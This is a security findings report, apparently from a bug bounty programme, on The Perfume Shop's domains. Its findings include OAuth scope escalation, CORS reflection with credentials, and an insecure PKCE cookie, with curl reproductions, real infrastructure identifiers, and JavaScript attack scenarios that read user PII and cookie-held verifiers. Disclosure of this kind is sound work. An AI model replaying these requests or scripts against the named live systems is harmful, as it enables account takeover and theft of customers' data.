# The Perfume Shop (AS Watson) - Bug Bounty Findings Report
## Intigriti Program - Authorized Security Assessment

**Date**: 2026-10-12
**Target**: theperfumeshop.com (AS Watson Group)
**Platform**: Intigriti

---

## Finding #1: Internal Origin Information Disclosure via HTTP Redirect Headers
**Severity**: Medium (Information Disclosure enabling further attacks)
**Domain**: connect.theperfumeshop.com, dev.connect.theperfumeshop.com, test.connect.theperfumeshop.com

### Description
The Connect application (Next.js on Azure Front Door) leaks the internal server binding address `https://0.0.0.0:8080` in HTTP `Location` redirect headers. When unauthenticated users access authenticated endpoints, the server returns a 307 redirect to the internal origin instead of the public-facing URL.

### Steps to Reproduce
1. Send a GET request to `https://connect.theperfumeshop.com/api/auth/signin/microsoft-entra-id`
2. Observe the HTTP 307 response with header:
   ```
   Location: https://0.0.0.0:8080/sign-in?callbackUrl=%2F
   ```
3. This is reproduced across all three environments:
   - `connect.theperfumeshop.com` (production)
   - `dev.connect.theperfumeshop.com` (development)
   - `test.connect.theperfumeshop.com` (testing)

### Evidence
```
HTTP/2 307
location: https://0.0.0.0:8080/sign-in?callbackUrl=%2F
x-azure-ref: 20261012T190755Z-15d65cf455cwv297hC1DTTy31w...
x-cache: CONFIG_NOCACHE
```

### Impact
- Reveals the internal Next.js application binds to `0.0.0.0:8080` behind Azure Front Door
- Confirms the application architecture (Azure Front Door reverse proxy -> internal app)
- Could assist an attacker in crafting SSRF payloads targeting internal services
- The `x-azure-ref` header leaks Azure infrastructure correlation IDs

### CVSS 4.0
**5.3** (Medium) - CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N

---

## Finding #2: Supabase Project Identifier and Infrastructure Disclosure
**Severity**: Medium (Information Disclosure)
**Domain**: techsale.theperfumeshop.com

### Description
The TPS Tech Sale internal application exposes its Supabase project identifier (`xrcihilprzuextoudevs`) in the Content-Security-Policy header. This identifier, combined with publicly accessible API endpoints, allows an attacker to directly query the Supabase REST API, Storage API, and Realtime API at `https://xrcihilprzuextoudevs.supabase.co/`.

### Steps to Reproduce
1. Send a GET request to `https://techsale.theperfumeshop.com/api/auth/session`
2. Observe the response headers:
   ```
   Content-Security-Policy: ... img-src 'self' data: blob: https://xrcihilprzuextoudevs.supabase.co ... connect-src 'self' https://xrcihilprzuextoudevs.supabase.co wss://xrcihilprzuextoudevs.supabase.co ...
   ```
3. The session endpoint also leaks the authentication backend mode:
   ```json
   {"success":true,"data":null,"mode":"supabase"}
   ```
4. The Supabase project is confirmed live and responding:
   - `https://xrcihilprzuextoudevs.supabase.co/rest/v1/` -> 401 "No API key found"
   - `https://xrcihilprzuextoudevs.supabase.co/storage/v1/bucket` -> 400

### Additional Information Disclosed
- **Build ID**: `I0YIRR3PHzNNSBPy_V2_d` (exposed in Next.js RSC payload)
- **Azure App Service Infrastructure**: ARRAffinity cookie values
- **External Image Sources**: `media.theperfumeshop.com`, `i5.walmartimages.com`, `d2q01ftr6ua4w.cloudfront.net`, `i.ebayimg.com`, `techmarket.co.uk`, etc.
- **X-Powered-By**: Next.js (version not stripped)
- **Public Health Endpoint**: `/api/health` returns `{"status":"ok"}`

### Impact
- An attacker with the Supabase anon key (typically embedded in client-side JavaScript) could directly access the database, bypassing the application's authorization layer
- If Row Level Security (RLS) is not properly configured, all database records (internal tech sale orders, employee data) could be exposed
- The WebSocket endpoint enables real-time subscription to database changes

### CVSS 4.0
**5.3** (Medium) - CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N

---

## Finding #3: Apache Default Test Page and Directory Listing
**Severity**: Low-Medium (Information Disclosure / Misconfiguration)
**Domain**: campaigns.theperfumeshop.com

### Description
The campaigns subdomain is running Apache 2.4.62 on Oracle Linux Server with the default test page displayed. Apache autoindex (mod_autoindex) is enabled, exposing the `/icons/` directory listing with 395+ files. Server version and OS information are disclosed in response headers.

### Steps to Reproduce
1. Navigate to `https://campaigns.theperfumeshop.com/` -> Default Apache HTTP Server Test Page
2. Navigate to `https://campaigns.theperfumeshop.com/icons/` -> Directory listing with 395 files
3. Response headers reveal:
   ```
   Server: Apache/2.4.62 (Oracle Linux Server)
   ```

### Evidence
- `/icons/` - 200 OK, 84KB (full directory listing)
- `/icons/small/` - 200 OK, 19KB (sub-directory listing)
- `/icons/README` - 200 OK, 5KB (Apache README file)
- `/.htaccess` and `/.htpasswd` - 403 Forbidden (properly blocked)
- `/cgi-bin/` - 403 Forbidden (different response size from default page)

### Impact
- Server version disclosure aids in identifying specific CVEs
- Directory listing exposes server configuration details
- Default test page indicates the server may not be fully hardened
- The server handles bot management cookies for `.theperfumeshop.com` domain, suggesting it's part of the production infrastructure

### CVSS 4.0
**4.3** (Low) - CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N

---

## Finding #4: Stale DNS CNAME Records (Lync/Skype for Business)
**Severity**: Low (Informational - stale but not immediately exploitable)
**Domain**: lyncdiscover.theperfumeshop.com, sip.theperfumeshop.com

### Description
Two subdomains have dangling CNAME records pointing to deprecated Microsoft Lync/Skype for Business services. While the domain appears to still be verified in Microsoft 365 (enterprise registration records exist), these stale CNAME records indicate decommissioned services that should be cleaned up.

### DNS Records
```
lyncdiscover.theperfumeshop.com -> CNAME -> webdir.online.lync.com (does not resolve to IP)
sip.theperfumeshop.com -> CNAME -> sipdir.online.lync.com (does not resolve to IP)
```

### Context
The domain is actively used in Microsoft 365:
- `enterpriseregistration.theperfumeshop.com` -> `enterpriseregistration.windows.net` (active)
- `enterpriseenrollment.theperfumeshop.com` -> `enterpriseenrollment-s.manage.microsoft.com` (active)

### Impact
- If the Microsoft 365 tenant is misconfigured or the domain verification lapses, these CNAME records could enable subdomain takeover
- Stale DNS records increase the attack surface and should be removed as part of DNS hygiene
- An attacker who could claim these records could potentially intercept Lync/SfB federation traffic

### Recommendation
Remove the `lyncdiscover` and `sip` CNAME records from DNS if Skype for Business Online is no longer in use. These services were retired by Microsoft in favor of Microsoft Teams.

---

## Finding #5: Hublio Intranet Technology Stack Disclosure
**Severity**: Low (Information Disclosure)
**Domain**: scentral.theperfumeshop.com

### Description
The Scentral intranet (Hublio SaaS platform) exposes its full technology stack and integration points through an overly permissive Content Security Policy and application metadata.

### Disclosed Information
- **Platform**: Hublio ("The company home for modern teams")
- **Hosting**: Azure Static Web Apps (`*.azurestaticapps.net`)
- **Backend**: Supabase (`*.supabase.co`)
- **AI Integration**: Lovable.dev AI Gateway (`ai.gateway.lovable.dev`)
- **Microsoft Integrations**: Graph API, SharePoint, Teams, Yammer/Viva Engage
- **Authentication**: Microsoft Entra ID (login.microsoftonline.com)
- **Map Services**: Azure Maps, OpenStreetMap, Carto
- **Image Storage**: Cloudflare R2 (`*.r2.dev`), Unsplash

### Impact
- The CSP header reveals the complete integration architecture
- An attacker could use this information to target specific integration points
- The Lovable.dev AI gateway connection is notable as it could be a vector for prompt injection

---

## Finding #6: NextAuth.js callbackUrl Parameter Reflection
**Severity**: Low (Potential Open Redirect post-authentication)
**Domain**: connect.theperfumeshop.com

### Description
The `callbackUrl` parameter on the sign-in page is reflected in the React Server Components (RSC) payload. While the HTML special characters are properly Unicode-escaped by React (preventing XSS), the parameter value is stored for post-authentication redirect, which could lead to an open redirect after a user completes the Microsoft Entra ID login flow.

### Steps to Reproduce
1. Navigate to `https://connect.theperfumeshop.com/sign-in?callbackUrl=https://evil.com`
2. The `evil.com` URL is reflected in the page's RSC payload (URL-encoded in path, decoded in JSON)
3. After authentication, the user may be redirected to the attacker-controlled URL

### Note
Full validation requires completing the Microsoft Entra ID authentication flow, which was not possible without valid credentials. The reflection was confirmed in the page source but the actual post-auth redirect behavior needs verification.

---

## Finding #7: Unnecessary Authentication Providers & Multi-Tenant Azure AD on Corporate Intranet
**Severity**: Medium (Infrastructure Misconfiguration / Defense-in-Depth Failure)
**Domain**: scentral.theperfumeshop.com

### Description
The Scentral corporate intranet (Hublio platform, hosted on Azure Static Web Apps) has multiple third-party authentication providers enabled at the infrastructure level, including GitHub OAuth and Azure AD in multi-tenant mode (`/common/`). While the Hublio application layer enforces its own "Organisational accounts only" restriction (blocking unauthorized users at the app level), the underlying Azure SWA infrastructure accepts authentication from **any GitHub account or any Microsoft account**.

**Confirmed behavior**: Navigating to `.auth/login/github` triggers a full GitHub OAuth redirect chain through `identity.7.azurestaticapps.net`, but after completing SWA-level auth, the Hublio app redirects the user back to its own login page ("Sign in with Microsoft 365 — Organisational accounts only"). The app-level auth currently mitigates full access, but the unnecessary SWA auth providers represent a defense-in-depth failure — if the Hublio app layer is ever bypassed, misconfigured, or removed, any GitHub/Microsoft user gains access.

This is the same vulnerability class documented by Wiz Research in "BingBang" (2023). The infrastructure misconfiguration is real; the current mitigation relies solely on the third-party Hublio application.

### Steps to Reproduce

**GitHub Authentication (any GitHub account):**
1. Navigate to `https://scentral.theperfumeshop.com/.auth/login/github`
2. Observe the 302 redirect chain:
   ```
   scentral.theperfumeshop.com/.auth/login/github
   -> identity.7.azurestaticapps.net/.redirect/github?hostName=purple-meadow-019c63c03.7.azurestaticapps.net&...
   -> identity.7.azurestaticapps.net/.auth/login/github?post_login_redirect_uri=/.auth/login/done
   -> github.com/login/oauth/authorize?client_id=Ov23liR2k5yQPDnQ8uQB&redirect_uri=https://identity.7.azurestaticapps.net/.auth/login/github/callback
   ```
3. The GitHub OAuth flow is fully functional with client_id `Ov23liR2k5yQPDnQ8uQB`
4. Any GitHub user can authorize the OAuth application and receive an authentication token

**Azure AD Multi-Tenant Authentication (any Microsoft account):**
1. Navigate to `https://scentral.theperfumeshop.com/.auth/login/aad`
2. Observe the 302 redirect chain:
   ```
   scentral.theperfumeshop.com/.auth/login/aad
   -> identity.7.azurestaticapps.net/.redirect/aad?hostName=purple-meadow-019c63c03.7.azurestaticapps.net&...
   -> login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=d414ee2d-73e5-4e5b-bb16-03ef55fea597&scope=openid+profile+email&response_type=code+id_token&response_mode=form_post
   ```
3. The `/common/` tenant endpoint accepts **any** Microsoft account (personal or organizational)
4. Scopes requested: `openid profile email`
5. Response type: `code id_token` (hybrid flow - tokens returned directly)

### Evidence
```
GitHub OAuth:
  Client ID: Ov23liR2k5yQPDnQ8uQB
  Redirect URI: https://identity.7.azurestaticapps.net/.auth/login/github/callback
  Status: Fully functional OAuth flow

Azure AD:
  Client ID: d414ee2d-73e5-4e5b-bb16-03ef55fea597
  Tenant: /common/ (multi-tenant - ANY Microsoft account)
  Redirect URI: https://identity.7.azurestaticapps.net/.auth/login/aad/callback
  Scopes: openid profile email
  Response Type: code id_token (hybrid flow)
  Status: Fully functional OAuth flow

Internal Azure SWA hostname: purple-meadow-019c63c03.7.azurestaticapps.net
Identity service: identity.7.azurestaticapps.net
Auth nonces: Leaked in redirect query parameters

Additional providers tested:
  Google (.auth/login/google): Redirect chain active, returns 401 at identity service (partially configured)
  Twitter (.auth/login/twitter): 424 Failed Dependency (broken configuration)
  Apple (.auth/login/apple): Not active (returns app page)
```

### Confirmed Test Result
- `.auth/login/github` triggers GitHub OAuth flow → SWA authenticates the user → Hublio app redirects back to its own "Organisational accounts only" login page
- The SWA infrastructure auth completes, but the Hublio app-level auth blocks unauthorized access
- **Current state**: Not a direct access bypass, but a defense-in-depth failure

### Impact
- **Medium**: GitHub OAuth app (client ID `Ov23liR2k5yQPDnQ8uQB`) is live and registered on a corporate intranet — unnecessary attack surface; any GitHub user can complete the OAuth flow at the SWA level
- **Medium**: Azure AD uses `/common/` (multi-tenant) instead of the organization's specific tenant ID — any Microsoft account can complete SWA-level auth
- **Medium**: If the Hublio application is ever reconfigured, updated, or experiences an error that disables its app-level auth check, the SWA-level auth alone would grant any GitHub/Microsoft user full access
- **Medium**: Internal Azure SWA hostname (`purple-meadow-019c63c03.7.azurestaticapps.net`) is publicly accessible from the internet
- **Low**: Authentication nonces leaked in redirect parameters; OAuth client IDs and redirect URIs exposed

### CVSS 4.0
**5.8** (Medium) - CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:L/SI:N/SA:N

### Recommendation
1. **Immediate**: Add `staticwebapp.config.json` with route restrictions that disable unused providers:
   ```json
   {
     "auth": {
       "identityProviders": {
         "customOpenIdConnectProviders": {}
       }
     },
     "routes": [
       { "route": "/.auth/login/github", "statusCode": 404 },
       { "route": "/.auth/login/google", "statusCode": 404 },
       { "route": "/.auth/login/twitter", "statusCode": 404 }
     ],
     "responseOverrides": {
       "401": { "redirect": "/.auth/login/aad" }
     }
   }
   ```
2. **Immediate**: Switch Azure AD from `/common/` to the organization's specific tenant ID to restrict authentication to TPS employees only
3. **Short-term**: Implement custom role-based access control, requiring explicit role assignment for access instead of relying on the default `authenticated` role
4. **Short-term**: Remove the internal SWA hostname from public accessibility or add it to the `staticwebapp.config.json` forwarding headers

---

## Finding #8: Client-Controlled Authorization Scope in OAuth Flow (Privilege Escalation)
**Severity**: High (Privilege Escalation)
**Domain**: techsale.theperfumeshop.com

### Description
The TPS Tech Sale application (Next.js + Supabase on Azure App Service) implements a custom OAuth flow via `/api/auth/oauth` that accepts a client-controlled `scope` parameter determining the user's authorization level. The application has at least two scope levels: `COLLEAGUE` (regular employee) and `ADMIN` (administrator). The server-side endpoint accepts **any scope value** without validation, returning a valid OAuth authorization URL with the attacker-controlled scope embedded in the callback URL.

After Microsoft OAuth completes, the callback at `/api/auth/callback?scope=ADMIN` receives the scope parameter and may use it to assign the user's role in the application. Since the scope originates from an unauthenticated client-side POST request, an attacker can escalate from `COLLEAGUE` to `ADMIN` simply by modifying the scope parameter.

### Steps to Reproduce
1. Send a POST request to the OAuth endpoint requesting admin scope:
   ```bash
   curl -X POST https://techsale.theperfumeshop.com/api/auth/oauth \
     -H 'Content-Type: application/json' \
     -d '{"scope":"ADMIN"}'
   ```
2. The server responds with a valid Supabase OAuth URL:
   ```json
   {
     "success": true,
     "url": "https://xrcihilprzuextoudevs.supabase.co/auth/v1/authorize?provider=azure&redirect_to=https://techsale.theperfumeshop.com/api/auth/callback?scope=ADMIN&scopes=openid profile email User.Read&code_challenge=..."
   }
   ```
3. Notice the callback URL contains `scope=ADMIN` — this value came directly from the client
4. A legitimate colleague would normally use `scope=COLLEAGUE`, but the server does not validate the scope value
5. The same Azure OAuth provider and scopes (`openid profile email User.Read`) are used regardless of the requested application scope

### Evidence
```
Normal colleague flow:
  POST /api/auth/oauth {"scope":"COLLEAGUE"}
  -> redirect_to=.../api/auth/callback?scope=COLLEAGUE

Escalated admin flow:
  POST /api/auth/oauth {"scope":"ADMIN"}
  -> redirect_to=.../api/auth/callback?scope=ADMIN

Both use identical Azure OAuth:
  Provider: azure (Microsoft Entra ID via Supabase)
  Supabase Project: xrcihilprzuextoudevs
  Scopes: openid profile email User.Read
  Code challenge method: S256 (PKCE)

Session info: {"success":true,"data":null,"mode":"supabase"}

Cookie set: colleague-sb-xrcihilprzuextoudevs-auth-token-code-verifier
  (Supabase PKCE code verifier, 400-day expiry)

Protected API endpoints discovered:
  /api/products  - 401 (product catalog)
  /api/items     - 401 (inventory items)
  /api/admin     - 401 (admin panel)
  /api/users     - 401 (user management)
  /api/orders    - 401 (order management)
  /api/catalogue - 401 (full catalogue)
  /api/config    - 401 (application config)
  /api/settings  - 401 (app settings)
```

### Impact
- **High**: A regular TPS employee (`COLLEAGUE` scope) can escalate to `ADMIN` scope, potentially gaining access to user management, order management, and application configuration
- **High**: An external attacker who compromises any Microsoft work account could directly request admin-level access
- **Medium**: The `/api/admin`, `/api/users`, `/api/orders`, and `/api/config` endpoints suggest significant admin functionality that would be accessible after scope escalation
- **Medium**: The Supabase PKCE code verifier cookie has a 400-day expiry (`Max-Age=34560000`), meaning a stolen session persists for over a year

### CVSS 4.0
**7.5** (High) - CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N

### Recommendation
1. **Immediate**: Validate the `scope` parameter server-side against a whitelist of allowed values; reject any request with an unrecognized scope
2. **Immediate**: Do not pass the authorization scope as a client-controlled callback parameter; determine the user's role server-side based on their identity after OAuth completes (e.g., by querying a roles table in Supabase)
3. **Short-term**: Implement server-side role assignment based on Azure AD group membership or email domain, not client-supplied parameters
4. **Short-term**: Reduce the PKCE code verifier cookie expiry from 400 days to a reasonable session duration (e.g., 8 hours)

---

## Finding #9: Supabase Project Infrastructure Exposure with Enumerable API Surface
**Severity**: Medium (Information Disclosure / Attack Surface Expansion)
**Domain**: techsale.theperfumeshop.com

### Description
The TPS Tech Sale application's Supabase backend infrastructure is fully enumerable from the client-side code and HTTP response headers. The Supabase project ID (`xrcihilprzuextoudevs`), authentication cookie names, Content-Security-Policy directives, and PKCE flow details are all exposed, providing a complete blueprint for attacking the backend.

Additionally, the Content-Security-Policy header reveals all allowed image source domains, WebSocket connections, and API endpoints, mapping out the application's full dependency chain.

### Steps to Reproduce
1. Visit `https://techsale.theperfumeshop.com/` and inspect the HTTP response headers
2. The `Content-Security-Policy` header reveals:
   ```
   connect-src 'self' https://xrcihilprzuextoudevs.supabase.co wss://xrcihilprzuextoudevs.supabase.co https://login.microsoftonline.com
   ```
3. The `Set-Cookie` header reveals the Supabase project ref in cookie names:
   ```
   colleague-sb-xrcihilprzuextoudevs-auth-token-code-verifier=base64-...
   ```
4. The Supabase instance responds to unauthenticated requests revealing its configuration:
   ```bash
   curl -D- https://xrcihilprzuextoudevs.supabase.co/auth/v1/settings
   # Returns: sb-error-code: UNAUTHORIZED_MISSING_API_KEY
   # Confirms: sb-project-ref: xrcihilprzuextoudevs, sb-gateway-version: 1
   ```
5. The CSP `img-src` reveals integration with external product image sources including Walmart, eBay, CloudFront, and others, suggesting a product aggregation feature

### Evidence
```
Supabase Project: xrcihilprzuextoudevs
Supabase URL: https://xrcihilprzuextoudevs.supabase.co
WebSocket: wss://xrcihilprzuextoudevs.supabase.co
Auth Provider: Azure (Microsoft Entra ID) via Supabase GoTrue
PKCE: S256 code challenge method
Cookie prefix: colleague-sb-xrcihilprzuextoudevs-auth-token-

CSP img-src allowlist (external product image sources):
  - https://media.theperfumeshop.com
  - https://i5.walmartimages.com
  - https://d2q01ftr6ua4w.cloudfront.net
  - https://i.ebayimg.com
  - https://techmarket.co.uk
  - https://image-pim.mapemall.com
  - https://multimedia.bbycastatic.ca
  - https://i-system.gr
  - https://img-prd-pim.poorvika.com
  - https://images2.kabum.com.br

Hosting: Azure App Service (ARRAffinity cookies)
Framework: Next.js with Turbopack (server-rendered React)
```

### Impact
- **Medium**: Complete backend infrastructure mapping enables targeted attacks against the Supabase instance
- **Medium**: The CSP image allowlist reveals business partnerships and product sourcing, which is commercially sensitive
- **Low**: Supabase response headers confirm the project ref and gateway version, aiding targeted attacks
- **Low**: ARRAffinity cookies reveal Azure App Service sticky session configuration

### CVSS 4.0
**5.3** (Medium) - CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N

### Recommendation
1. **Immediate**: Suppress Supabase project identifiers from cookie names; use generic names like `auth-code-verifier`
2. **Short-term**: Restrict CSP `img-src` to only domains actually used; the broad allowlist suggests copy-paste configuration
3. **Short-term**: Consider proxying Supabase requests through the application backend to hide the direct Supabase URL from clients

---

## Finding #10: CORS Wildcard Subdomain Reflection with Credentials on E-commerce API
**Severity**: High (Cross-Origin Data Theft / Account Takeover Chain)
**Domain**: api.theperfumeshop.com, api-s1.theperfumeshop.com, media.theperfumeshop.com, media-s1.theperfumeshop.com

### Description
The entire API and media infrastructure serving the main e-commerce site reflects any `https://*.theperfumeshop.com` subdomain as a trusted CORS origin, combined with `Access-Control-Allow-Credentials: true`. The frontend SPA (SAP Hybris Composable Storefront) is configured with `useWithCredentials: true`, meaning all API calls carry authentication cookies cross-origin.

This means JavaScript running on **any** subdomain of theperfumeshop.com can make authenticated cross-origin requests to the e-commerce API and read the responses, including personal data, order history, saved addresses, and payment information.

### Steps to Reproduce
1. Send a request to `api.theperfumeshop.com` with an arbitrary subdomain origin:
   ```bash
   curl -D- -H "Origin: https://attacker.theperfumeshop.com" \
     "https://api.theperfumeshop.com/api/v2/tpsgb/currencies"
   ```
2. Observe the response headers:
   ```
   access-control-allow-origin: https://attacker.theperfumeshop.com
   access-control-allow-credentials: true
   access-control-allow-methods: GET,POST,HEAD,PUT,PATCH,DELETE,OPTIONS
   ```
3. Verify the same behavior on all API/media instances:
   - `api-s1.theperfumeshop.com` (staging API)
   - `media.theperfumeshop.com` (media CDN)
   - `media-s1.theperfumeshop.com` (staging media)

### Evidence
```
# Production API
$ curl -D- -H "Origin: https://evil.theperfumeshop.com" https://api.theperfumeshop.com/...
access-control-allow-origin: https://evil.theperfumeshop.com
access-control-allow-credentials: true

# Multi-level subdomain also accepted
$ curl -D- -H "Origin: https://test.evil.theperfumeshop.com" https://api.theperfumeshop.com/...
access-control-allow-origin: https://test.evil.theperfumeshop.com
access-control-allow-credentials: true

# HTTP origins correctly rejected (HTTPS-only)
$ curl -D- -H "Origin: http://evil.theperfumeshop.com" https://api.theperfumeshop.com/...
access-control-allow-origin: https://api.theperfumeshop.com  (not reflected)

# External domains correctly rejected
$ curl -D- -H "Origin: https://evil.com" https://api.theperfumeshop.com/...
access-control-allow-origin: https://api.theperfumeshop.com  (not reflected)

SPA Configuration (from main-NTGUEOI7.js):
  prefix: "/api/v2/"
  useWithCredentials: true
  occ-backend-base-url: https://api.theperfumeshop.com
```

### Attack Chain
The CORS wildcard enables a direct attack path when combined with any of the following subdomain compromise vectors (all verified as reachable):
1. **XSS on any subdomain**: techsale, connect, scentral, dev.connect, test.connect, campaigns, or any of 30+ enumerated subdomains
2. **Subdomain takeover**: Multiple subdomains return 502 Bad Gateway (videogift, refer, prod-cc, prod-k, bp, bpie) indicating potentially claimable backend infrastructure
3. **campaigns.theperfumeshop.com** runs a default Apache test page with directory listing enabled -- no application deployed, potentially writable

Attack scenario:
```javascript
// JavaScript on any *.theperfumeshop.com subdomain
fetch('https://api.theperfumeshop.com/api/v2/tpsgb/users/current', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  // Read victim's PII, orders, saved payment methods, addresses
  exfiltrate(data);
});
```

### Impact
- **Critical**: Any XSS on any subdomain escalates to full authenticated API access on the main e-commerce platform
- **High**: Attacker can read user PII (name, email, phone, addresses, order history, saved payment methods)
- **High**: Attacker can perform actions as the user (modify cart, change delivery address, place orders)
- **High**: The attack surface includes 30+ subdomains, development/test environments, and abandoned infrastructure
- **Medium**: The SPA's `useWithCredentials: true` configuration confirms cookies are the authentication mechanism

### CVSS 4.0
**8.3** (High) - CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N

### Recommendation
1. **Immediate**: Replace the wildcard subdomain CORS pattern with an explicit allowlist of trusted origins (`https://www.theperfumeshop.com`, `https://api.theperfumeshop.com`)
2. **Immediate**: Apply the same fix to api-s1, media, and media-s1 instances
3. **Short-term**: Decommission or secure abandoned subdomains (videogift, refer, prod-cc, prod-k, bp, bpie) to reduce the attack surface
4. **Short-term**: Deploy a web application on campaigns.theperfumeshop.com or remove the DNS entry -- the default Apache page with directory listing is a liability
5. **Medium-term**: Consider moving to token-based authentication for API calls instead of cookie-based to eliminate CORS credential risks

---

## Finding #11: SAP Commerce Cloud Backend Hostname Exposure in Client-Side JavaScript
**Severity**: Medium (Information Disclosure)
**Domain**: www.theperfumeshop.com

### Description
The main site's client-side JavaScript bundle (`main-NTGUEOI7.js`) contains the direct SAP Commerce Cloud backend hostname: `sd.cmb8j9fjhz-emea5aswa1-d1-public.model-t.cc.commerce.ondemand.com`. This hostname bypasses the Akamai WAF and CDN layer, allowing an attacker to probe the backend directly for vulnerabilities without WAF filtering.

### Steps to Reproduce
1. Fetch the main JavaScript bundle:
   ```bash
   curl "https://www.theperfumeshop.com/main-NTGUEOI7.js" | grep "ondemand.com"
   ```
2. The backend hostname is embedded in an image URL reference:
   ```
   https://sd.cmb8j9fjhz-emea5aswa1-d1-public.model-t.cc.commerce.ondemand.com/medias/sys_master/images/...
   ```
3. Direct access to the backend returns SAP Commerce Cloud error pages (403 Forbidden) instead of Akamai WAF blocks, confirming the backend is directly reachable

### Evidence
```
$ curl https://sd.cmb8j9fjhz-emea5aswa1-d1-public.model-t.cc.commerce.ondemand.com/occ/v2/tpsgb/
HTTP/1.1 403 Forbidden
Server: *
X-SAP-Pad: 6837830
X-Cache: MISS from sd.cmb8j9fjhz-emea5aswa1-d1-public.model-t.cc.commerce.ondemand.com
<title>SAP Commerce Cloud - Forbidden</title>

Backend also reveals in JavaScript:
  OAuth endpoint: /authorizationserver/oauth/token
  Client config: client_id: ui.ID, client_secret: ui.SECRET
  Base sites: tpsgb (UK), tpsie (Ireland)
  API prefix: /api/v2/
```

### Impact
- **Medium**: Attacker can bypass Akamai WAF and probe the SAP Commerce Cloud backend directly
- **Medium**: The backend responds with SAP-specific error pages revealing server technology and cache status
- **Low**: Combined with the OAuth endpoint path, an attacker could attempt credential brute-forcing directly against the backend
- **Low**: The hostname pattern reveals the SAP Commerce Cloud environment identifier (`cmb8j9fjhz`) and region (`emea5`)

### CVSS 4.0
**5.3** (Medium) - CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N

### Recommendation
1. **Immediate**: Remove direct backend hostname references from client-side JavaScript; serve media through the media.theperfumeshop.com CDN exclusively
2. **Short-term**: Configure the SAP Commerce Cloud backend to reject requests not originating from the Akamai CDN (IP allowlisting or shared secret)
3. **Short-term**: Suppress `X-SAP-Pad` and `X-Cache` response headers from the backend

---

## Finding #14: Insecure OAuth PKCE Code Verifier Cookie — Missing HttpOnly/Secure Flags with 400-Day Lifetime
**Severity**: High (OAuth Security Bypass / Token Theft)
**Domain**: techsale.theperfumeshop.com

### Description
The techsale internal application's OAuth flow stores the PKCE code_verifier in a cookie that is missing critical security attributes. The cookie lacks both `HttpOnly` and `Secure` flags, and has an excessive lifetime of 400 days. The PKCE code_verifier is a security-critical OAuth 2.0 parameter — if an attacker obtains it alongside the authorization code, they can exchange it for full access tokens, achieving account takeover.

### Steps to Reproduce
1. Initiate the OAuth flow:
   ```bash
   $ curl -D- -X POST "https://techsale.theperfumeshop.com/api/auth/oauth" \
     -H "Content-Type: application/json" \
     -d '{"scope":"COLLEAGUE"}'
   ```
2. Observe the `Set-Cookie` header for the code_verifier:
   ```
   Set-Cookie: colleague-sb-xrcihilprzuextoudevs-auth-token-code-verifier=base64-IjQxNWVm...
   Path=/; Expires=Tue, 16 Nov 2027 23:40:30 GMT; Max-Age=34560000; SameSite=lax
   ```
3. Note the security issues:
   - **No `HttpOnly` flag** — accessible via `document.cookie` in JavaScript
   - **No `Secure` flag** — can be transmitted over HTTP (mitigated by HSTS)
   - **Max-Age=34560000** (400 days) — code_verifier persists far beyond the OAuth flow
   - **Path=/** — accessible from any path on the domain
4. The code_verifier value is a base64-encoded hex string, easily decodable:
   ```bash
   $ echo "IjQxNWVm..." | base64 -d
   "415ef443795349c4418c3bcf53520bd2cfbdc895959e3a40710f572c0832467f..."
   ```
5. The same vulnerability exists for all scope levels:
   ```
   COLLEAGUE → colleague-sb-*-code-verifier (no HttpOnly, no Secure)
   ADMIN     → admin-sb-*-code-verifier     (no HttpOnly, no Secure)
   ```

### Evidence
```
# COLLEAGUE scope cookie:
Set-Cookie: colleague-sb-xrcihilprzuextoudevs-auth-token-code-verifier=base64-IjQxNWVm...
  Path=/; Expires=Tue, 16 Nov 2027 23:40:30 GMT; Max-Age=34560000; SameSite=lax
  ❌ Missing: HttpOnly
  ❌ Missing: Secure
  ❌ Max-Age: 400 days (should be ~5 minutes)

# ADMIN scope cookie:
Set-Cookie: admin-sb-xrcihilprzuextoudevs-auth-token-code-verifier=base64-IjlkYmIz...
  Path=/; Expires=Tue, 16 Nov 2027 23:41:00 GMT; Max-Age=34560000; SameSite=lax
  ❌ Missing: HttpOnly
  ❌ Missing: Secure
  ❌ Max-Age: 400 days (should be ~5 minutes)

# Contrast with Azure session cookies (properly secured):
Set-Cookie: ARRAffinity=...; Path=/; HttpOnly; Secure; Domain=techsale.theperfumeshop.com
  ✅ HttpOnly ✅ Secure
```

### Attack Scenario
Any XSS vulnerability on `techsale.theperfumeshop.com` (including via compromised dependencies) enables:
```javascript
// 1. Read the PKCE code_verifier from cookies (not HttpOnly!)
const verifier = document.cookie
  .split(';')
  .find(c => c.includes('code-verifier'))
  .split('=')[1];

// 2. Decode the base64-encoded verifier
const decoded = atob(verifier.replace('base64-', ''));

// 3. Use the verifier to exchange any intercepted auth code for tokens
// The code_verifier persists for 400 days, providing a long attack window
```

### Impact
- **High**: Any XSS on techsale enables reading the PKCE code_verifier, bypassing the PKCE protection designed to prevent authorization code interception
- **High**: The 400-day cookie lifetime provides an extended attack window — stale code verifiers accumulate in the browser
- **Medium**: Cookie name leaks the Supabase project identifier and authentication scope level
- **Medium**: Missing `Secure` flag violates OAuth 2.0 Security Best Current Practice (RFC 9700)

### CVSS 4.0
**7.1** (High) - CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N

### Recommendation
1. **Immediate**: Add `HttpOnly` and `Secure` flags to the code_verifier cookie
2. **Immediate**: Reduce cookie Max-Age to 300 seconds (5 minutes) — the OAuth flow should complete within seconds
3. **Short-term**: Consider using server-side session storage for the code_verifier instead of a client-side cookie
4. **Short-term**: Sanitize cookie names to not include the Supabase project identifier or scope level

---

